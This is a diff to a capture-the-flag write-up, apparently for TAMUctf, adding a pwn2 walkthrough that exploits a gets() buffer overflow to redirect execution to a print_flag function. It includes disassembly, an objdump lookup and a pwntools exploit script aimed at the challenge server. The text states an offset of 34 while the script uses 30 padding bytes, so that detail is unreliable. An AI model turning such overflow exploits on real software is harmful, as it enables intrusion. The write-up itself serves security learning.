@@ -198,7 +198,9 @@ $ python exploit.py
    Right. Off you go.
    gigem{34sy_CC428ECD75A0D392}
 ```
+
 * * *
+
 ## pwn2
 #### Standard for all pwn challenges - we start a simple reconnaisance by using checksec
 ```
@@ -219,23 +221,7 @@ $ ./pwn2
 $ gdb ./pwn2
     gdb-peda$ disas main
     Dump of assembler code for function main:
-       0x000007dc <+0>:	    lea    ecx,[esp+0x4]
-       0x000007e0 <+4>:	    and    esp,0xfffffff0
-       0x000007e3 <+7>:	    push   DWORD PTR [ecx-0x4]
-       0x000007e6 <+10>:	push   ebp
-       0x000007e7 <+11>:	mov    ebp,esp
-       0x000007e9 <+13>:	push   ebx
-       0x000007ea <+14>:	push   ecx
-       0x000007eb <+15>:	sub    esp,0x20
-       0x000007ee <+18>:	call   0x5b0 <__x86.get_pc_thunk.bx>
-       0x000007f3 <+23>:	add    ebx,0x17c5
-       0x000007f9 <+29>:	mov    eax,DWORD PTR [ebx+0x3c]
-       0x000007ff <+35>:	mov    eax,DWORD PTR [eax]
-       0x00000801 <+37>:	push   0x0
-       0x00000803 <+39>:	push   0x0
-       0x00000805 <+41>:	push   0x2
-       0x00000807 <+43>:	push   eax
-       0x00000808 <+44>:	call   0x520 <setvbuf@plt>
+       [...]
        0x0000080d <+49>:	add    esp,0x10
        0x00000810 <+52>:	sub    esp,0xc
        0x00000813 <+55>:	lea    eax,[ebx-0x1670]
@@ -251,17 +237,9 @@ $ gdb ./pwn2
        0x00000834 <+88>:	lea    eax,[ebp-0x27]
        0x00000837 <+91>:	push   eax
        0x00000838 <+92>:	call   0x77f <select_func>
-       0x0000083d <+97>:	add    esp,0x10
-       0x00000840 <+100>:	mov    eax,0x0
-       0x00000845 <+105>:	lea    esp,[ebp-0x8]
-       0x00000848 <+108>:	pop    ecx
-       0x00000849 <+109>:	pop    ebx
-       0x0000084a <+110>:	pop    ebp
-       0x0000084b <+111>:	lea    esp,[ecx-0x4]
-       0x0000084e <+114>:	ret    
-    End of assembler dump.
+       [...]
 ```
-#### Interestingly enough, a gets() call is executed to ask for the user input, which can be the entry point for our exploit. But another function to take note of is ```select_func``` which uses the buffer at ```[ebp-0x27]``` as the argument. Let's have a look at all the functions in the binary so we know what options are available for us to choose from:
+#### Interestingly enough, a ```gets``` call is executed to ask for the user input, which can be the entry point for our exploit. But another function to take note of is ```select_func``` which uses the buffer at ```[ebp-0x27]``` as the argument. Let's have a look at all the functions in the binary so we know what options are available for us to choose from:
 ```
 gdb-peda$ info functions
     [...]
@@ -285,4 +263,44 @@ two
 $ ./pwn2
 print_flag
 ```
+#### Sadly, we get nothing out of it. We do want to be able to execute the print_flag function tho, as we know it prints the flag for us. Remember that the input uses ```gets``` to get user input? We can utilize that vulnerability to perform a buffer overflow into overwriting the ```eip``` register to point to the address of the ```print_flag``` function. Before we do that, we need to know the address of the function. We can do that using *objdump*:
+```
+$ objdump -M intel -d pwn2 | grep print_flag
+    000006d8 <print_flag>:
+        [...]
+```
+#### We take a note that ```print_flag```'s address is at ```0x000006d8```. Next thing we need to know is the exact size of the buffer to trigger the segmentation fault. Though the buffer is stored at address ```[ebp-0x27]``` which has a size of 39, the exact offset to overflow the buffer and overwrite the eip register is at offset 34. We can now create a short exploit script and send the result to the server to get the flag.
+#### exploit.py
+```
+from pwn import *
+
+#: Connect to challenge server
+HOST = 'pwn.tamuctf.com'
+PORT = 4322
+conn = remote(HOST, PORT)
+
+#: Exploit code
+offset = 'A' * 30
+eip = p32(0x000006d8)
+exploit = offset + eip
+
+#: Send data
+print(conn.recvline())
+conn.sendline(exploit)
+print(conn.recvline())
+print(conn.recvline())
+```
+### And the script returns us the flag!
+```
+Which function would you like to call?
+
+This function is still under development.
+
+gigem{4ll_17_74k35_15_0n3}
+```
+
+* * *
+
+## pwn3
+
 
